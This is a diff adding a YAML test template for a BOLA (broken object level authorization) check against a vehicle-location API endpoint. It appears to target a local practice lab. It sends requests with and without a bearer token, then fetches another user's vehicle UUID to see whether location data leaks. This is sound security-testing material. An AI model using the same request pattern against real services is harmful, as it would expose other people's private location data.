@@ -1,0 +1,40 @@
+name: BOLA template for challenge 1 
+
+description: |- 
+              Endpoint /identity/api/v2/vehicle/{uuid}/location allows us to check out vehicle's location.
+              This endpoint requires Authorization, but we might be able to view another user's vehicle information if we have their UUID
+              The following will test the endpoint for the resultant BOLA vulnerability found by:
+                  checking for status_code as it was observed that status_code 200 is the code for successful query.
+                  text pattern "vehicleid" and "latitude" is used as these strings are found when request is successful 
+              In the sample, we are only using 2 uuid and 3 request. 
+              First without token to test if we need authorization token, second with token to establish the a happy flow and last the BOLA vulenrability
+
+requests:
+  - url: http://localhost:8888/identity/api/v2/vehicle/{add your own uuid}/location
+    method: GET
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: {add your own uuid}
+          - pattern: latitude
+
+requests:
+  - url: http://localhost:8888/identity/api/v2/vehicle/{add your own uuid}/location
+    method: GET
+    headers:
+      Authorization: Bearer {add your own jwt}
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: {add your own uuid}
+          - pattern: latitude
+
+  - url: http://localhost:8888/identity/api/v2/vehicle/4234c4ee-c0a5-4e43-b025-679e5294094c/location
+    method: GET
+    headers:
+      Authorization: Bearer {add your own jwt}
+    response_checks:
+      - status_code: 200
+      - text:
+          - pattern: 4234c4ee-c0a5-4e43-b025-679e5294094c
+          - pattern: latitude
